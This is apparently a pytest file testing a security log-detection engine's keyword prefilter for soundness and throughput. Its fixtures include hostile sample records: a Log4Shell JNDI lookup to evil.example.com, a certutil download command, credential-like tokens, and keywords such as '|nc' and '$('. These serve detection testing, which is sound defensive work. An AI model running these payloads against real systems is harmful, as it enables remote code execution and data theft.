"""Prefilter soundness and throughput.

The keyword prefilter decides which rules are evaluated for each record. If it
ever misses a rule the engine silently stops detecting, so the invariant is
tested directly rather than inferred from the end to end results.
"""

from __future__ import annotations

import random
import time

import pytest

from app.engine.event import Event
from app.engine.executor import DetectionEngine, HuntContext, keyword_anchor
from app.engine.parsers import enrich
from app.engine.rules import ALL_RULES
from app.engine.rules.base import PatternRule, SequenceRule, StatisticalRule, ThresholdRule

SINGLE_EVENT_RULES = [rule for rule in ALL_RULES if not isinstance(rule, StatisticalRule)]
KEYWORD_RULES = [rule for rule in SINGLE_EVENT_RULES if rule.keywords]


def candidates_for(engine: DetectionEngine, event: Event) -> set[str]:
    """Reproduce the prefilter decision for one record."""
    from app.engine.executor import _PREFIX_MIN, _TOKEN_RE

    selected = set(engine.always_rules)
    code = event.get_str("event.code")
    if code:
        selected |= engine.code_index.get(code, set())
    text = event.searchable
    for token in _TOKEN_RE.findall(text):
        if token in engine.token_keys:
            selected |= engine.token_index[token]
        if engine.prefix_heads and len(token) > _PREFIX_MIN and token[:_PREFIX_MIN] in engine.prefix_heads:
            for length in engine.prefix_lengths:
                if length < len(token):
                    selected |= engine.prefix_index.get(token[:length], set())
    if engine.residual_regex is not None:
        for match in engine.residual_regex.finditer(text):
            selected |= engine.residual_index[match.group(0)]
    return selected


def keyword_matches(keyword: str, runs: set[str], text: str) -> bool:
    """The prefilter contract, written out independently of the index.

    A keyword matches when its anchor appears as a complete alphanumeric run in
    the record, or, for a short bare identifier such as ``akia``, when a run
    starts with it. Matching a keyword in the middle of a longer run is
    deliberately excluded: ``4900`` inside the byte count ``490045`` is noise,
    not a detection.
    """
    from app.engine.executor import is_identifier_prefix, keyword_anchor

    lowered = keyword.lower()
    anchor = keyword_anchor(lowered)
    if anchor is None:
        return lowered in text
    if anchor in runs:
        return True
    if is_identifier_prefix(lowered):
        return any(run.startswith(anchor) for run in runs)
    return False


def ground_truth(event: Event) -> set[str]:
    """Rules the contract says must be evaluated for this record."""
    from app.engine.executor import _TOKEN_RE

    text = event.searchable
    runs = set(_TOKEN_RE.findall(text))
    selected = set()
    code = event.get_str("event.code")
    for rule in SINGLE_EVENT_RULES:
        if not rule.keywords and not rule.event_codes:
            selected.add(rule.id)
            continue
        if code and code in rule.event_codes:
            selected.add(rule.id)
            continue
        if any(keyword_matches(keyword, runs, text) for keyword in rule.keywords):
            selected.add(rule.id)
    return selected


class TestAnchorSelection:
    @pytest.mark.parametrize("keyword,expected", [
        ("certutil", "certutil"),
        ("certutil.exe", "certutil"),
        ("currentversion\\run", "currentversion"),
        ("${jndi:", "jndi"),
        (".xyz", "xyz"),
        ("wevtutil", "wevtutil"),
        ("set-mppreference", "mppreference"),
    ])
    def test_anchor_is_a_run_of_the_keyword(self, keyword, expected):
        assert keyword_anchor(keyword) == expected

    @pytest.mark.parametrize("keyword", ["../", "1=1", "$(", "|nc"])
    def test_keywords_without_a_usable_run_fall_back(self, keyword):
        assert keyword_anchor(keyword) is None

    def test_the_anchor_is_always_inside_the_keyword(self):
        for rule in KEYWORD_RULES:
            for keyword in rule.keywords:
                anchor = keyword_anchor(keyword)
                if anchor is not None:
                    assert anchor in keyword.lower(), (rule.id, keyword)


class TestPrefilterSoundness:
    @pytest.fixture(scope="class")
    def engine(self):
        return DetectionEngine(list(ALL_RULES))

    @pytest.mark.parametrize("rule", KEYWORD_RULES, ids=[rule.id for rule in KEYWORD_RULES])
    def test_every_keyword_reaches_its_rule(self, engine, rule):
        """A record containing a keyword must make that rule a candidate."""
        for keyword in rule.keywords:
            event = Event(raw=f"prefix noise {keyword} suffix noise", source_file="t.log",
                          data_source="generic")
            assert rule.id in candidates_for(engine, event), (rule.id, keyword)

    @pytest.mark.parametrize("rule", [rule for rule in SINGLE_EVENT_RULES if rule.event_codes],
                             ids=[rule.id for rule in SINGLE_EVENT_RULES if rule.event_codes])
    def test_every_event_code_reaches_its_rule(self, engine, rule):
        for code in rule.event_codes:
            event = Event(raw="record", source_file="t.log", data_source="generic",
                          fields={"event.code": code})
            assert rule.id in candidates_for(engine, event), (rule.id, code)

    def test_rules_without_hints_are_always_candidates(self, engine):
        event = Event(raw="nothing interesting here", source_file="t.log", data_source="generic")
        selected = candidates_for(engine, event)
        assert engine.always_rules <= selected

    def test_every_rule_is_reachable(self, engine):
        """No rule may be unreachable, which would make it dead code."""
        reachable = set(engine.always_rules)
        reachable |= {rule_id for ids in engine.token_index.values() for rule_id in ids}
        reachable |= {rule_id for ids in engine.residual_index.values() for rule_id in ids}
        reachable |= {rule_id for ids in engine.code_index.values() for rule_id in ids}
        expected = {rule.id for rule in SINGLE_EVENT_RULES}
        assert expected - reachable == set()


class TestPrefilterAgainstRealData:
    """The index must never drop a rule that plain substring search would keep.

    Synthetic records with space padded keywords are too easy: they hide the
    case where a keyword sits inside a longer run, which is exactly how
    credential prefixes such as AKIA appear. These cases are checked against
    the real generated evidence.
    """

    @pytest.fixture(scope="class")
    def parsed(self, sample_archive, tmp_path_factory):
        from app.engine.runner import parse_evidence

        context, _ = parse_evidence(sample_archive, tmp_path_factory.mktemp("prefilter"))
        return context.events

    @pytest.fixture(scope="class")
    def engine(self):
        return DetectionEngine(list(ALL_RULES))

    def test_the_index_is_sound_over_the_whole_corpus(self, engine, parsed):
        missed: dict[str, int] = {}
        for event in parsed:
            expected = ground_truth(event)
            actual = candidates_for(engine, event)
            for rule_id in expected - actual:
                missed[rule_id] = missed.get(rule_id, 0) + 1
            event.release_cache()
        assert not missed, f"the prefilter dropped rules that a plain search keeps: {missed}"

    @pytest.mark.parametrize("record,rule_id", [
        ("export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE", "saas-secret-in-log"),
        ("token glpat-ABCDEFGHIJKLMNOPQRST issued", "saas-secret-in-log"),
        ("slack webhook xoxb-1234567890-abcdefghij", "saas-secret-in-log"),
        ("certutil.exe -urlcache -split -f http://x/y", "win-lolbin-download"),
        ("${jndi:ldap://evil.example.com/a}", "web-log4shell"),
        ("query for kq3v9zxlwmnbrtd.xyz", "net-suspicious-tld"),
    ])
    def test_embedded_keywords_still_reach_their_rule(self, engine, record, rule_id):
        event = Event(raw=record, source_file="t.log", data_source="structured")
        assert rule_id in candidates_for(engine, event)


class TestThroughput:
    @pytest.fixture(scope="class")
    def events(self):
        rng = random.Random(41)
        hosts = [f"WS-{index:03d}" for index in range(60)]
        users = [f"user{index:03d}" for index in range(120)]
        processes = ["svchost.exe", "explorer.exe", "chrome.exe", "outlook.exe", "teams.exe"]
        base = 1_772_000_000
        records = []
        for index in range(40000):
            process = rng.choice(processes)
            event = Event(
                raw=f'{{"ts":"{base + index}","host":"{rng.choice(hosts)}","user":"{rng.choice(users)}",'
                    f'"image":"C:\\\\Windows\\\\System32\\\\{process}","cmd":"{process} -k netsvcs"}}',
                source_file="bulk.json", line_no=index, data_source="sysmon",
                timestamp=base + index * 0.5,
            )
            event.set("host.name", rng.choice(hosts))
            event.set("user.name", rng.choice(users))
            event.set("process.executable", f"C:\\Windows\\System32\\{process}")
            event.set("process.command_line", f"{process} -k netsvcs")
            records.append(enrich(event))
        return records

    def test_the_whole_library_keeps_up(self, events):
        engine = DetectionEngine(list(ALL_RULES))
        started = time.perf_counter()
        engine.run(HuntContext(events=list(events)))
        elapsed = time.perf_counter() - started
        rate = len(events) / elapsed
        # Measured at roughly 18,000 records a second. The bound is deliberately
        # loose so the test reports a real regression rather than machine noise.
        assert rate > 4000, f"detection throughput fell to {rate:,.0f} records a second"

    def test_the_search_text_is_released_after_matching(self, events):
        engine = DetectionEngine(list(ALL_RULES))
        sample = list(events[:2000])
        engine.run(HuntContext(events=sample))
        cached = [event for event in sample if event._searchable_cache is not None]
        assert not cached, "the lowercased search text must not stay resident"
